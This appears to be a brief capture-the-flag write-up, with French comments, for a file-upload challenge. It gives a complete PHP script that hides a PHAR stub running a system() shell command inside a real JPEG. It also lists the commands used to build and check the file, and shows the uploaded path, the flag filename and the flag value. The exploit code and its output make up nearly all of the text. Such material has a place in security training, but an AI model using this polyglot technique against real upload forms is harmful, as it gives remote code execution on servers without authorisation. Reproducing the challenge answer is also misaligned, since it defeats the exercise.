# File upload - Polyglot

<?php

$target = 'exploit.jpg';

$temp_phar = 'exploit.phar';

$real_jpg = 'real.jpg'; // Ton image 1x1

if (file_exists($temp_phar)) unlink($temp_phar);

if (file_exists($target)) unlink($target);

$phar = new Phar($temp_phar);

$phar->startBuffering();

// On ajoute un fichier bidon (requis pour la structure PHAR)

$phar->addFromString('test.txt', 'test');

// ON MET LE CODE DIRECTEMENT DANS LE STUB

$stub = file_get_contents($real_jpg) . '<?php system("ls -la .."); __HALT_COMPILER(); ?>';

$phar->setStub($stub);

$phar->stopBuffering();

rename($temp_phar, $target);

echo "Nouveau polyglotte généré : $target\\n";

?>

Ensuite on modifie le « ls -la » pour faire la vraie recherche

convert -size 1x1 xc:white real.jpg

php -d phar.readonly=0 gen_robust.php

file exploit.jpg

- uploads/phpdD4FNe.jpg

flag-juygaz36YyTFyT6R.txt

NowYouAreBilingual!
